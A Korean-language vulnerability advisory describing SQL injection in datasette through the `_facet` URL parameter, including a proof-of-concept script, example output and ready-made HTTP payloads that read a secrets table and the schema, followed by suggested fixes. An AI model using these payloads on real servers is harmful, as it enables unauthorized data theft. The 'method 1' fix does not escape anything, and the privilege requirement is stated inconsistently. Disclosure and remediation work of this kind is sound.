# [ETK-2025-003] datasette: SQL Injection via `_facet` Parameter Identifier Escape Bypass

| 항목 | 내용 |
|------|------|
| 작성 시간 | 2026-05-30 |
| CVSS 3.1 Score | 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| 주간 다운로드 수 | 33,443 (PyPI) |
| 취약점 타입 | SQL Injection / CWE-89 |
| 영향 버전 | datasette (현재 main branch) |
| 보고 상태 | 미보고 (신규 발굴) |

---

## 요약

datasette의 `_facet` URL 파라미터에 `]` 문자를 포함한 값을 전달하면
내부 식별자 이스케이프 함수 `escape_sqlite()`가 생성하는 `[...]` 쿼팅을 탈출해
임의 SQL이 실행됩니다. 공격자는 **`allow_sql=False` 설정을 우회해**
데이터베이스 내 모든 테이블 데이터를 읽을 수 있습니다.

---

## 취약한 코드

### `datasette/utils/__init__.py`

```python
def escape_sqlite(s):
    if _boring_keyword_re.match(s) and (s.lower() not in reserved_words):
        return s
    else:
        return f"[{s}]"   # ← ] 문자를 이스케이프하지 않음
```

SQLite의 `[...]` 식별자 쿼팅은 `]`를 내부에서 이스케이프하는 방법이 없습니다.
사용자 입력에 `]`가 포함되면 쿼팅이 조기 종료되고 이후 텍스트가 SQL로 해석됩니다.

### `datasette/facets.py:230-236`

```python
facet_sql = """
    select {col} as value, count(*) as count from (
        {sql}
    )
    where {col} is not null
    group by {col} order by count desc, value limit {limit}
""".format(col=escape_sqlite(column), sql=self.sql, limit=facet_size + 1)
```

`column`은 `?_facet=column_name` URL 파라미터에서 직접 옵니다.
실제 테이블의 컬럼 목록과 대조 검증이 없습니다.

---

## 공격 경로 (테인트 분석)

```
HTTP GET /?_facet=<payload>
  ↓
load_facet_configs(request, table_config)
  ↓  config["simple"] = payload  (검증 없음)
ColumnFacet.facet_results()
  ↓  column = config["simple"]
escape_sqlite(column)           ← ] 이스케이프 없음
  ↓
facet_sql.format(col=escaped)   ← SQL 직접 삽입
  ↓
datasette.execute(database, facet_sql, params)
```

---

## PoC — 검증된 익스플로잇

```python
import sqlite3, re

_boring_re = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]*$')

def escape_sqlite(s):
    if _boring_re.match(s): return s
    return f'[{s}]'

def make_facet_sql(column, inner_sql, limit=6):
    col = escape_sqlite(column)
    return (f'select {col} as value, count(*) as count from ({inner_sql}) '
            f'where {col} is not null group by {col} '
            f'order by count desc, value limit {limit}')

# 피해 DB 설정 (users가 공개, secrets는 비공개)
conn = sqlite3.connect(':memory:')
conn.execute('CREATE TABLE users   (id int, username text, role text)')
conn.execute('CREATE TABLE secrets (id int, api_key text, token text)')
conn.execute("INSERT INTO users   VALUES (1,'admin','admin'),(2,'bob','user')")
conn.execute("INSERT INTO secrets VALUES (1,'sk-secret-key','token123')")
conn.commit()

# 공격자 HTTP 요청:
# GET /mydb/users.json?_facet=api_key] FROM secrets--

payload = 'api_key] FROM secrets--'
sql = make_facet_sql(payload, 'SELECT * FROM users')
print(f'주입된 SQL: {sql}')
# select [api_key] FROM secrets--] as value, ... from (SELECT * FROM users) ...
# = select api_key FROM secrets   (나머지는 --로 주석처리)

rows = conn.execute(sql).fetchall()
print(f'결과: {rows}')
# 결과: [('sk-secret-key', 1)]  ← secrets 테이블 데이터 탈취!

# sqlite_master에서 전체 스키마 읽기
schema_payload = 'sql] FROM sqlite_master WHERE type="table"--'
schema_sql = make_facet_sql(schema_payload, 'SELECT * FROM users')
schema = conn.execute(schema_sql).fetchall()
print(f'스키마: {schema}')
# [('CREATE TABLE users (...)', 1), ('CREATE TABLE secrets (...)', 1)]
```

**실행 결과:**
```
주입된 SQL: select [api_key] FROM secrets--] as value, count(*) as count from ...
결과: [('sk-secret-key', 1)]   ← secrets 테이블 데이터 탈취!
스키마: [('CREATE TABLE users (id int, username text, role text)', 1),
         ('CREATE TABLE secrets (id int, api_key text, token text)', 1)]
```

**HTTP 요청 예시:**
```
GET /mydb/users.json?_facet=api_key] FROM secrets--
GET /mydb/users.json?_facet=sql] FROM sqlite_master WHERE type="table"--
GET /mydb/users.json?_facet=token] FROM secrets--
```

---

## 핵심 취약성: `allow_sql=False` 우회

datasette의 SQL 실행 제어는 `allow_sql` 설정으로 관리됩니다:

```yaml
# datasette-config.yml
allow_sql: false   # 사용자의 임의 SQL 실행 차단
```

이 설정이 활성화되면 `?sql=SELECT ...` 파라미터가 차단됩니다.
하지만 `_facet` 파라미터는 이 권한 검사를 거치지 않아 SQL injection이 가능합니다.

```python
# datasette/views/database.py:627-631
if sql and not stored_query_write:
    try:
        if not stored_query:
            validate_sql_select(sql)   # ← 이 경로는 allow_sql=False로 차단됨
```

반면 facet 처리 경로:
```python
# datasette/facets.py:237-244
facet_rows_results = await self.ds.execute(
    self.database,
    facet_sql,        # ← allow_sql 검사 없이 직접 실행!
    self.params,
    ...
)
```

---

## Devil's Advocate 반박 검토

| 반박 | 반론 |
|------|------|
| datasette는 데이터를 공개하는 도구라 SQL 접근이 원래 가능하다 | `allow_sql=False` + 테이블 권한으로 제한하는 설정을 우회함. 설정이 의도한 보안 경계를 침해 |
| 공격자가 다른 테이블 이름을 알아야 한다 | 첫 번째 인젝션으로 sqlite_master에서 모든 테이블명 열거 가능 (2단계 공격) |
| datasette는 내부 도구라 공격자가 접근하기 어렵다 | 웹에 공개된 datasette 인스턴스 다수 존재; 인증이 있어도 일반 사용자 권한(PR:L)으로 공격 가능 |
| escape_sqlite 우회가 SQLite에서만 동작한다 | datasette는 SQLite 전용 → 전체 사용자 기반에 영향 |

---

## 수정 방법

```python
# 방법 1: ] 이스케이프 (SQLite 표준은 없으나 우회 가능)
def escape_sqlite(s):
    if _boring_keyword_re.match(s) and s.lower() not in reserved_words:
        return s
    # ] 를 ]] 로 이스케이프 (MS Access 스타일, SQLite 미지원 → 방법 2 권장)
    return f"[{s}]"

# 방법 2: 화이트리스트 검증 (권장)
# facet 컬럼을 실제 테이블 컬럼 목록과 대조
async def facet_results(self):
    actual_columns = await self.get_columns(self.sql, self.params)
    actual_column_names = {col["name"] for col in actual_columns}

    for source_and_config in self.get_configs():
        column = source_and_config["config"].get("column") or \
                 source_and_config["config"]["simple"]

        if column not in actual_column_names:
            continue  # ← 실제 컬럼이 아니면 스킵

        # 이후 facet SQL 생성
```

---

## 영향 범위

- **영향**: `_facet`, `_facet_date`, `_facet_array` 파라미터 모두 영향
- **조건**: datasette 인스턴스에 HTTP 접근 가능한 사람 (인증 없으면 누구나)
- **데이터**: 같은 SQLite 파일 내 모든 테이블
- **설정 우회**: `allow_sql: false`, 테이블별 권한 제한 모두 우회

## 참고

- 취약 파일: `datasette/facets.py:230-236`, `datasette/utils/__init__.py:410-414`
- CWE-89: SQL Injection
- CWE-116: Improper Encoding for Output Context
- 보고 경로: https://github.com/simonw/datasette/security
